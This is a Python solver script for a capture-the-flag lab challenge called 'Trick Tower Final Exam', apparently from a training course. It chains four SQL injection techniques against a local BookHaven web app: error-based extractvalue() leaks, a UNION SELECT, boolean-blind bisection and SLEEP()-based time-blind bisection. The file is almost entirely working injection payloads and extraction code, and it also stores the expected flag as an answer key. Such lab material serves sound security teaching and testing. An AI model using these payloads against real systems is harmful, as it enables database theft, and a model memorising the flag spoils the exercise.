#!/usr/bin/env python3
"""solvers/f1.py, Task F.1 "Trick Tower Final Exam" (BookHaven) canonical
exploit.

Four stages, four independent SQLi techniques, genuinely chained: each
stage's vulnerable query never runs at all until the *previous* stage's
real key is supplied as that stage's `token` (checked with a safe,
parameterized lookup in challenges/finals.py's _stage_key()). There is no
shortcut, the only way to ever learn a stage's key is to run that
stage's own technique against the real, seeded bookhaven_stage_keys table:

  Stage 1 (error-based):   extractvalue() leaks stage 1's key in a DBMS error.
  Stage 2 (union-based):   a UNION SELECT matching the 3-column result set
                            pulls stage 2's key out as an ordinary-looking row.
  Stage 3 (boolean-blind): a PASS/FAIL-only oracle, walked char-by-char via
                            ASCII()/SUBSTRING() bisection, recovers stage 3's key.
  Stage 4 (time-blind):    IF(condition, SLEEP(N), 0) timing, walked the
                            same way, recovers the final flag itself.

This is a real, live extraction against the running stack at every stage;
nothing below is hardcoded except the final assertion against the expected
flag.
"""

from __future__ import annotations

import os
import sys
import time

import requests

BASE = os.environ.get("SEIYAKU_BASE", "http://localhost:8000")
EXPECTED_FLAG = "SEIYAKU{all_four_styles_descend}"

MAX_LEN = 96
ASCII_LOW = 32
ASCII_HIGH = 126

# Same per-row multiplier consideration as p1_5: bookhaven_catalog has 4
# seeded rows, and the vulnerable WHERE clause is non-sargable (an OR'd
# IF() defeats any index), so MariaDB evaluates the injected IF() once per
# row scanned, a "true" answer's real elapsed time is roughly
# ROW_COUNT x SLEEP_SECONDS, not 1x. A generous per-row sleep plus a
# comfortably-separated threshold keeps the oracle unambiguous without
# needing to hardcode the exact row count.
SLEEP_SECONDS = 0.35
THRESHOLD_SECONDS = 0.6


def stage1_error_based() -> str:
    """Extract stage 1's key via a MariaDB extractvalue() error leak,
    identical technique to Phase 1's Netero's Recipe Vault (p1_2)."""
    payload = (
        "1' AND extractvalue(1,concat(0x3a,"
        "(SELECT key_value FROM bookhaven_stage_keys WHERE stage=1)))-- -"
    )
    resp = requests.get(
        f"{BASE}/f/bookhaven/stage1", params={"id": payload}, timeout=10
    )
    resp.raise_for_status()
    body = resp.text
    # extractvalue()'s XPATH error embeds the leaked value after a ':'
    # separator, inside the exception text rendered onto the page. Jinja
    # auto-escapes the surrounding quotes as HTML entities (&#39;), same
    # as p1_2's template.
    marker = "XPATH syntax error: &#39;"
    idx = body.find(marker)
    if idx == -1:
        raise RuntimeError("stage 1: extractvalue() marker not found in response")
    tail = body[idx + len(marker):]
    leaked = tail.split("&#39;", 1)[0]
    key = leaked.lstrip(":")
    if not key:
        raise RuntimeError("stage 1: leaked an empty key")
    return key


def stage2_union_based(stage1_key: str) -> str:
    """Extract stage 2's key via a UNION SELECT matching
    bookhaven_catalog's 3-column (id, title, author) shape, identical
    technique to Phase 1's Exam Results Board (p1_3)."""
    payload = (
        "nonexistent' UNION SELECT stage,key_value,'x' "
        "FROM bookhaven_stage_keys WHERE stage=2-- -"
    )
    resp = requests.get(
        f"{BASE}/f/bookhaven/stage2",
        params={"token": stage1_key, "q": payload},
        timeout=10,
    )
    resp.raise_for_status()
    body = resp.text
    if "token accepted" not in body:
        raise RuntimeError("stage 2: token was not accepted, stage 1 key wrong?")
    # The union'd row renders stage_keys.key_value into the <td> that
    # normally holds a book title.
    import re

    m = re.search(r'<td class="px-3 py-2 break-all">2</td>\s*'
                   r'<td class="px-3 py-2 break-all">([^<]+)</td>', body)
    if not m:
        raise RuntimeError("stage 2: union'd row not found in response")
    return m.group(1)


def stage3_oracle(token: str, code: str) -> bool:
    resp = requests.get(
        f"{BASE}/f/bookhaven/stage3",
        params={"token": token, "code": code},
        timeout=10,
    )
    resp.raise_for_status()
    body = resp.text
    if "token accepted" not in body:
        raise RuntimeError("stage 3: token was not accepted, stage 2 key wrong?")
    has_pass = "PASS" in body
    has_fail = "FAIL" in body
    if has_pass == has_fail:
        raise RuntimeError(f"stage 3: ambiguous oracle response for code={code!r}")
    return has_pass


def stage3_boolean_blind(stage2_key: str) -> str:
    """Recover stage 3's key via the same PASS/FAIL bisection technique as
    Phase 1's Trick Tower Silent Room (p1_4)."""

    def discover_length() -> int:
        lo, hi = 0, MAX_LEN
        while lo < hi:
            mid = (lo + hi + 1) // 2
            payload = (
                "' OR LENGTH((SELECT key_value FROM bookhaven_stage_keys "
                f"WHERE stage=3))>={mid}-- -"
            )
            if stage3_oracle(stage2_key, payload):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def discover_char(position: int) -> str:
        lo, hi = ASCII_LOW, ASCII_HIGH
        while lo < hi:
            mid = (lo + hi + 1) // 2
            payload = (
                "' OR ASCII(SUBSTRING((SELECT key_value FROM "
                f"bookhaven_stage_keys WHERE stage=3),{position},1))>={mid}-- -"
            )
            if stage3_oracle(stage2_key, payload):
                lo = mid
            else:
                hi = mid - 1
        return chr(lo)

    length = discover_length()
    print(f"  stage 3 key length: {length}")
    chars = [discover_char(i) for i in range(1, length + 1)]
    return "".join(chars)


def stage4_timed(token: str, lookup_id: str) -> float:
    start = time.monotonic()
    resp = requests.get(
        f"{BASE}/f/bookhaven/stage4",
        params={"token": token, "id": lookup_id},
        timeout=30,
    )
    elapsed = time.monotonic() - start
    resp.raise_for_status()
    if "token accepted" not in resp.text:
        raise RuntimeError("stage 4: token was not accepted, stage 3 key wrong?")
    return elapsed


def stage4_time_blind(stage3_key: str) -> str:
    """Recover the final flag via the same SLEEP()-timing bisection
    technique as Phase 1's Zevil Island Medical Bay (p1_5)."""

    def oracle(payload: str) -> bool:
        elapsed = stage4_timed(
            stage3_key,
            f"' OR IF(({payload}),SLEEP({SLEEP_SECONDS}),0)-- -",
        )
        return elapsed >= THRESHOLD_SECONDS

    def discover_length() -> int:
        lo, hi = 0, MAX_LEN
        while lo < hi:
            mid = (lo + hi + 1) // 2
            cond = (
                "LENGTH((SELECT key_value FROM bookhaven_stage_keys "
                f"WHERE stage=4))>={mid}"
            )
            if oracle(cond):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def discover_char(position: int) -> str:
        lo, hi = ASCII_LOW, ASCII_HIGH
        while lo < hi:
            mid = (lo + hi + 1) // 2
            cond = (
                "ASCII(SUBSTRING((SELECT key_value FROM bookhaven_stage_keys "
                f"WHERE stage=4),{position},1))>={mid}"
            )
            if oracle(cond):
                lo = mid
            else:
                hi = mid - 1
        return chr(lo)

    length = discover_length()
    print(f"  final flag length: {length}")
    chars = []
    for pos in range(1, length + 1):
        c = discover_char(pos)
        chars.append(c)
        print(f"  position {pos:>2}: {c!r}  (so far: {''.join(chars)!r})")
    return "".join(chars)


def main() -> int:
    print(f"[f1] target: {BASE}/f/bookhaven")

    print("[f1] stage 1, error-based extraction of stage 1's key")
    stage1_key = stage1_error_based()
    print(f"  ok: stage 1 key = {stage1_key!r}")

    print("[f1] stage 2, union-based extraction of stage 2's key")
    stage2_key = stage2_union_based(stage1_key)
    print(f"  ok: stage 2 key = {stage2_key!r}")

    print("[f1] stage 3, boolean-blind extraction of stage 3's key")
    stage3_key = stage3_boolean_blind(stage2_key)
    print(f"  ok: stage 3 key = {stage3_key!r}")

    print("[f1] stage 4, time-blind extraction of the final flag")
    flag = stage4_time_blind(stage3_key)
    print(f"[f1] recovered flag: {flag!r}")

    if flag != EXPECTED_FLAG:
        print("  FAIL: recovered value does not match expected flag")
        print(f"  expected: {EXPECTED_FLAG}")
        print(f"  got:      {flag}")
        print("[f1] FAIL")
        return 1

    print(f"  ok: recovered flag matches: {EXPECTED_FLAG}")
    print("[f1] PASS")
    return 0


if __name__ == "__main__":
    sys.exit(main())
